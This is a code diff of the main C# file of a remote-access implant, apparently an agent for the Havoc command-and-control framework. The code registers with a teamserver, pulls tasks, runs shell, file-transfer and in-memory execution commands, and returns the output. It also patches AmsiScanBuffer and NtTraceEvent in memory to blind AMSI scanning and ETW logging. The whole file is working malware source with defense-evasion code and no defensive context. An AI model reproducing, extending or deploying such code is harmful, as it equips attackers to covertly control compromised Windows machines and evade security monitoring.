@@ -4,21 +4,15 @@ using System.Linq;
 using System.Text;
 using System.Runtime.InteropServices;
 using System.Threading.Tasks;
-using System.Net.Http;
 using System.Net;
-using System.Collections;
-using System.IO;
 using System.Diagnostics;
 using System.Threading;
-using System.Text.RegularExpressions;
 using Microsoft.Win32;
-using System.Security.Cryptography;
-using System.Management;
-using HavocImplant.AgentFunctions.BofExec;
-using HavocImplant.AgentFunctions.BofExec.Internals;
 using HavocImplant.NativeUtils;
-using static HavocImplant.Implant;
 using HavocImplant.Communications;
+using HavocImplant.AgentFunctions;
+using System.Reflection;
+using System.Windows.Forms;
 
 namespace HavocImplant
 {
@@ -42,10 +36,14 @@ namespace HavocImplant
         {
             public string taskCommand;
             public string taskOutput;
+            public string taskArguments;
+            public string taskFile;
             public task(string taskCommand, string taskOutput)
             {
                 this.taskCommand = taskCommand;
                 this.taskOutput = taskOutput;
+                taskArguments = "";
+                taskFile = "";
             }
         }
 
@@ -61,15 +59,32 @@ namespace HavocImplant
         public string processName = Process.GetCurrentProcess().ProcessName;
         public string osVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
 
-        // Locking resource related stuff
-        static readonly object pe_lock = new object();
-        static void Main(string[] args) // Looping through tasks and stuff
+
+        public static List<CommandInterface> Commands = new List<CommandInterface>();
+
+        static async Task Main() // Looping through tasks and stuff
         {
+
+            RunPatches();
             Implant implant = new Implant();
             Random rand = new Random();
 
             Comms.Init(implant);
             Communications.Utils.Init(implant);
+            // Load our commands, thanks Rasta
+            var self = Assembly.GetExecutingAssembly();
+
+            foreach (var type in self.GetTypes())
+            {
+                if (!type.IsSubclassOf(typeof(CommandInterface)))
+                    continue;
+
+                var command = (CommandInterface)Activator.CreateInstance(type);
+                command.Init(implant);
+
+                Commands.Add(command);
+            }
+
             if (implant.secure) ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
 
             while (!implant.registered) Comms.Register();
@@ -84,26 +99,24 @@ namespace HavocImplant
                 if (rawTasks.Length > 4)
                 {
                     int offset = 0;
-                    string task = "";
+                    task Task;
 
                     // Parsing the raw request from teamserver, splitting task into dictionary entries
                     while (offset < rawTasks.Length)
                     {
 
-                        int size = BitConverter.ToInt32(new List<byte>(rawTasks).GetRange(offset, 4).ToArray(), 0); // [4 bytes containing size of task][task]
-                        Console.WriteLine($"Task is of size {size}");
+                        // [4 bytes containing size of task][task]
+                        // The trailing nullbytes is removed within the handler, but after size calculation, so we need to account for it here
+                        int size = BitConverter.ToInt32(new List<byte>(rawTasks).GetRange(offset, 4).ToArray(), 0) - 1;
+                        Console.WriteLine($"Task JSON is of size {size}");
 
-                        string dirtyTask = Encoding.UTF8.GetString(rawTasks, offset + 4, size); // Clear up the funky
-                        List<byte> dirtyArray = Encoding.UTF8.GetBytes(dirtyTask).ToList<byte>();
-                        dirtyArray.RemoveAll(item => item == 0x00);
-
-                        task = Encoding.UTF8.GetString(dirtyArray.ToArray());
-                        Console.WriteLine($"Task is {task}");
-
+                        Task = Communications.Utils.ParseTask(rawTasks, size, offset);
+                        Console.WriteLine($"Task is {Task.taskCommand}");
+                        Console.WriteLine($"Args are {Task.taskArguments}");
                         offset += size + 4;
 
                         int taskId = rand.Next(10000 * 10000);
-                        implant.taskingInformation.Add(taskId, new Implant.task(task, ""));
+                        implant.taskingInformation.Add(taskId, Task);
                         Console.WriteLine("Task has id {0}", taskId);
 
                     }
@@ -113,89 +126,38 @@ namespace HavocImplant
                     // Parsing the commands from the dictionary
                     for (int i = 0; i < implant.taskingInformation.Count; i++)
                     {
-                        string command = implant.taskingInformation.Values.ToList<Implant.task>()[i].taskCommand;
 
-                        int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
-                        Console.WriteLine("The ID is: {0}", taskId);
-
-                        switch (command.Split(' ')[0])
-                        {
-                            case "shell":
-                                Thread shellThread = new Thread(() => AgentFunctions.Shell.Run(implant, command.Substring(5).Trim(), taskId));
-                                shellThread.Start();
-                                break;
-                            case "goodbye":
-                                Console.WriteLine("It is die time my dudes"); Environment.Exit(Environment.ExitCode); break;
-                            case "sleep":
-                                Thread sleepThread = new Thread(() => AgentFunctions.Sleep.Run(implant, command.Substring(5).Trim(), taskId));
-                                sleepThread.Start();
-                                break;
-                            case "ls":
-                                Thread lsThread = new Thread(() => AgentFunctions.Ls.Run(implant, command.Substring(2).Trim(), taskId));
-                                lsThread.Start();
-                                break;
-                            case "upload":
-                                Thread uploadThread = new Thread(() => AgentFunctions.Upload.Run(implant, command.Substring(6).Trim(), taskId));
-                                uploadThread.Start();
-                                break;
-                            case "download":
-                                Thread downloadThread = new Thread(() => AgentFunctions.Download.Run(implant, command.Substring(8).Trim(), taskId));
-                                downloadThread.Start();
-                                break;
-                            case "bofexec":
-                                /*
-                                List<string> bofArgs = command.Substring(7).Trim().Split(';').ToList<string>();
-                                List<string> bof = new List<string>();
-                                if (bofArgs.Count > 2)
-                                {
-                                    bof.Add(bofArgs[bofArgs.Count-1]);
-                                    bofArgs.RemoveAt(bofArgs.Count-1);
-                                }
-                                
-                                Console.WriteLine($"bofArgs count: {bofArgs.Count}");
-                                for (int ii = 0; ii < bofArgs.Count; ii++)
-                                {
-                                    Console.WriteLine($"Arg {ii} is: {bofArgs[ii]}");
-                                }
-                                */
-                                string[] bofArgs = new string[] { command.Substring(7).Trim() };
-                                Thread bofExecThread = new Thread(() => AgentFunctions.BofExec.BofExec.Run(implant, bofArgs, taskId));
-                                bofExecThread.Start();
-                                break;
-                                
-                            case "inline_assembly":
-                                Thread inlineAssemblyThread = new Thread(() => AgentFunctions.InlineAssembly.Run(implant, command.Substring(15).Trim(), taskId));
-                                inlineAssemblyThread.Start();
-                                break;
-                                
-                            case "inline_pe":
-                                lock (pe_lock)
-                                {
-                                    Thread inlinePEThread = new Thread(() => AgentFunctions.InlinePE.Run(implant, command.Substring(9).Trim(), taskId));
-                                    inlinePEThread.Start();
-                                    break;
-                                }
-                        }
+                        int taskId = implant.taskingInformation.Keys.ToList()[i];
+                        Console.WriteLine("The current id is: {0}", taskId);
+                        HandleCommand(implant.taskingInformation[taskId], taskId);
+                        
                     }
                 }
-                Thread.Sleep(implant.sleepTime);
                 string cumalativeOutput = "";
 
                 for (int i = 0; i < implant.taskingInformation.Count; i++)
                 {
-                    int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
+                    int taskId = implant.taskingInformation.Keys.ToList()[i];
                     if (!String.IsNullOrEmpty(implant.taskingInformation[taskId].taskOutput))
                     {
                         Console.WriteLine($"Shipping off Task ID {taskId}");
                         cumalativeOutput += implant.taskingInformation[taskId].taskOutput + "\n";
                         implant.taskingInformation.Remove(taskId);
+                        i--;
                     }
-                    i--;
                 }
                 Comms.CheckIn(implant, cumalativeOutput, "commandoutput");
+                Thread.Sleep(implant.sleepTime);
             }
         }
-       
+        public static async Task HandleCommand(task Task, int taskId)
+        {
+            if (Task.taskCommand == "exit") Environment.Exit(0);
+            var com = Commands.FirstOrDefault(c => c.Command == Task.taskCommand);
+            if (com.Dangerous == true)
+                await com.Run(taskId);
+            else com.Run(taskId);
+        }
         static string getIPv4()
         {
             foreach (var a in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
@@ -221,20 +183,30 @@ namespace HavocImplant
             patch[4] = 0x80;
             patch[5] = 0xc3;
             IntPtr pAmsi = (IntPtr)globalDll.kernel32.dynamicExecute<Delegates.LoadLibraryA>("LoadLibraryA", new object[] {"amsi.dll"});
-            Console.WriteLine("Amsi at 0x{0:X}", (long)pAmsi);
             dll amsi = new dll("amsi.dll");
             IntPtr pAmsiScanBuffer = amsi.dictOfExports["AmsiScanBuffer"];
-            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pAmsiScanBuffer, (IntPtr)patch.Length, (uint)Structs.Win32.Enums.PAGE_READWRITE, (uint)0 });
+            
+            IntPtr aPatchSize = (IntPtr)patch.Length;
+            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), pAmsiScanBuffer, ref aPatchSize, Structs.Win32.Enums.PAGE_READWRITE, out uint unused);
+
             GCHandle hPatch = GCHandle.Alloc(patch, GCHandleType.Pinned);
-            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtWriteVirtualMemory>("NtWriteVirtualMemory",  new object[] { (IntPtr)(-1), pAmsiScanBuffer, hPatch.AddrOfPinnedObject(), (uint)patch.Length, (uint)0});
+            Wrappers.NtWriteVirtualMemory((IntPtr)(-1), pAmsiScanBuffer, hPatch.AddrOfPinnedObject(), (uint)patch.Length, out unused);
             hPatch.Free();
-            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pAmsiScanBuffer, (IntPtr)patch.Length, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READ, (uint)0 });
+
+            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), pAmsiScanBuffer, ref aPatchSize, Structs.Win32.Enums.PAGE_EXECUTE_READ, out unused);
+
             // ETW
             IntPtr pNtTraceEvent = IntPtr.Add(globalDll.ntdll.dictOfExports["NtTraceEvent"], 3);
-            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pNtTraceEvent, (IntPtr)1, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READWRITE, (uint)0 });
-            Marshal.WriteByte(pNtTraceEvent, 0xc3);
-            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pNtTraceEvent, (IntPtr)1, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READ, (uint)0 });
+            IntPtr ePatchSize = (IntPtr)1;
+            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), pNtTraceEvent, ref ePatchSize, Structs.Win32.Enums.PAGE_EXECUTE_READWRITE, out unused);
+           
+            hPatch = GCHandle.Alloc(new byte[] { 0xc3 }, GCHandleType.Pinned);
+            Wrappers.NtWriteVirtualMemory((IntPtr)(-1), pNtTraceEvent, hPatch.AddrOfPinnedObject(), (uint)1, out unused);
+            hPatch.Free();
+
+            Wrappers.NtProtectVirtualMemory((IntPtr)(-1), pNtTraceEvent, ref ePatchSize, Structs.Win32.Enums.PAGE_EXECUTE_READ, out unused);
             
         }
+
     }
 }
